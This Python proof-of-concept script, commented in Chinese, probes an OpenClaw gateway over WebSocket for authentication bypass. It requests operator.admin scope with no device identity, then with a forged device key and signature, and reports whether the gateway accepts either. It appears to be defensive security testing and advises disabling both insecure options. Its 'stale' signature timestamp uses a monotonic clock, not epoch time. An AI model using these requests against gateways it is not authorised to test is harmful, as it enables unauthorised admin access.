#!/usr/bin/env python3
"""
PoC: OpenClaw 不安全认证配置绕过测试
测试 gateway.controlUi.allowInsecureAuth 选项的安全风险

当 allowInsecureAuth 启用时，攻击者可以在HTTP环境下无需设备身份验证
直接连接到Gateway，绕过ED25519设备签名验证。
"""

import asyncio
import json
import websockets
from dataclasses import dataclass
from typing import Optional, Dict, Any


@dataclass
class VulnResult:
    name: str
    vulnerable: bool
    details: str
    severity: str


class InsecureAuthBypassTester:
    """测试不安全的认证配置绕过"""
    
    def __init__(self, gateway_url: str = "ws://localhost:3000"):
        self.gateway_url = gateway_url
        self.results: list[VulnResult] = []
    
    async def test_http_context_device_bypass(self) -> VulnResult:
        """
        测试在HTTP环境下（非安全上下文）是否允许连接而不提供设备身份
        当 allowInsecureAuth=true 时，crypto.subtle 不可用会导致跳过设备认证
        """
        # 模拟HTTP环境下的连接参数（无设备签名）
        connect_params = {
            "minProtocol": 3,
            "maxProtocol": 3,
            "client": {
                "id": "control-ui",
                "version": "1.0.0",
                "platform": "web",
                "mode": "webchat"
            },
            "role": "operator",
            "scopes": ["operator.admin"],
            # 注意：这里没有 device 字段，模拟HTTP环境下的情况
            "auth": {
                "token": "test-token"
            }
        }
        
        try:
            async with websockets.connect(self.gateway_url) as ws:
                # 等待 challenge
                challenge = await asyncio.wait_for(ws.recv(), timeout=5.0)
                challenge_data = json.loads(challenge)
                
                # 发送没有设备身份的 connect 请求
                request = {
                    "type": "req",
                    "id": "test-001",
                    "method": "connect",
                    "params": connect_params
                }
                await ws.send(json.dumps(request))
                
                response = await asyncio.wait_for(ws.recv(), timeout=5.0)
                response_data = json.loads(response)
                
                if response_data.get("ok") is True:
                    return VulnResult(
                        name="HTTP Context Device Auth Bypass",
                        vulnerable=True,
                        details="Gateway accepted connection without device identity. "
                                "This indicates allowInsecureAuth may be enabled.",
                        severity="HIGH"
                    )
                else:
                    error_msg = response_data.get("error", {}).get("message", "")
                    if "secure context" in error_msg.lower() or "device" in error_msg.lower():
                        return VulnResult(
                            name="HTTP Context Device Auth Bypass",
                            vulnerable=False,
                            details="Gateway correctly rejected connection without device identity",
                            severity="INFO"
                        )
                    return VulnResult(
                        name="HTTP Context Device Auth Bypass",
                        vulnerable=False,
                        details=f"Connection rejected: {error_msg}",
                        severity="INFO"
                    )
                    
        except websockets.exceptions.ConnectionClosed as e:
            return VulnResult(
                name="HTTP Context Device Auth Bypass",
                vulnerable=False,
                details=f"Connection closed: {e.reason}",
                severity="INFO"
            )
        except Exception as e:
            return VulnResult(
                name="HTTP Context Device Auth Bypass",
                vulnerable=False,
                details=f"Error during test: {str(e)}",
                severity="INFO"
            )
    
    async def test_disabled_device_auth(self) -> VulnResult:
        """
        测试 dangerouslyDisableDeviceAuth 配置
        此配置会完全跳过设备签名时间戳验证
        """
        # 构造一个过期的签名（1小时前）
        stale_signed_at = int(asyncio.get_event_loop().time() * 1000) - 3600000
        
        connect_params = {
            "minProtocol": 3,
            "maxProtocol": 3,
            "client": {
                "id": "control-ui",
                "version": "1.0.0",
                "platform": "web",
                "mode": "webchat"
            },
            "role": "operator",
            "scopes": ["operator.admin"],
            "device": {
                "id": "fake-device-id",
                "publicKey": "fake-public-key",
                "signature": "fake-signature",
                "signedAt": stale_signed_at  # 1小时前的签名
            },
            "auth": {
                "token": "test-token"
            }
        }
        
        try:
            async with websockets.connect(self.gateway_url) as ws:
                challenge = await asyncio.wait_for(ws.recv(), timeout=5.0)
                request = {
                    "type": "req",
                    "id": "test-002",
                    "method": "connect",
                    "params": connect_params
                }
                await ws.send(json.dumps(request))
                
                response = await asyncio.wait_for(ws.recv(), timeout=5.0)
                response_data = json.loads(response)
                
                if response_data.get("ok") is True:
                    return VulnResult(
                        name="Disabled Device Auth Accepts Stale Signatures",
                        vulnerable=True,
                        details="Gateway accepted stale device signature (>10 min old). "
                                "This indicates dangerouslyDisableDeviceAuth may be enabled.",
                        severity="CRITICAL"
                    )
                return VulnResult(
                    name="Disabled Device Auth",
                    vulnerable=False,
                    details="Gateway correctly rejected stale signature",
                    severity="INFO"
                )
        except Exception as e:
            return VulnResult(
                name="Disabled Device Auth",
                vulnerable=False,
                details=f"Test error: {str(e)}",
                severity="INFO"
            )
    
    async def run_all_tests(self) -> list[VulnResult]:
        """运行所有测试"""
        print("=" * 60)
        print("OpenClaw Authentication Security Tests")
        print("=" * 60)
        
        tests = [
            self.test_http_context_device_bypass(),
            self.test_disabled_device_auth(),
        ]
        
        results = await asyncio.gather(*tests, return_exceptions=True)
        
        for result in results:
            if isinstance(result, Exception):
                print(f"[ERROR] Test failed with exception: {result}")
            else:
                self.results.append(result)
                status = "VULNERABLE" if result.vulnerable else "SAFE"
                print(f"[{status}] {result.name}")
                print(f"  Severity: {result.severity}")
                print(f"  Details: {result.details}")
                print()
        
        return self.results


def main():
    """主函数"""
    import sys
    
    gateway_url = sys.argv[1] if len(sys.argv) > 1 else "ws://localhost:3000"
    tester = InsecureAuthBypassTester(gateway_url)
    
    try:
        results = asyncio.run(tester.run_all_tests())
        
        vulnerable_count = sum(1 for r in results if r.vulnerable)
        
        print("=" * 60)
        print(f"Results: {vulnerable_count}/{len(results)} vulnerabilities found")
        print("=" * 60)
        
        if vulnerable_count > 0:
            print("\n[!] WARNING: Insecure authentication configurations detected!")
            print("    Consider disabling allowInsecureAuth and dangerouslyDisableDeviceAuth")
            return 1
        else:
            print("\n[+] No authentication bypass vulnerabilities detected")
            return 0
            
    except KeyboardInterrupt:
        print("\n[!] Tests interrupted by user")
        return 130


if __name__ == "__main__":
    exit(main())
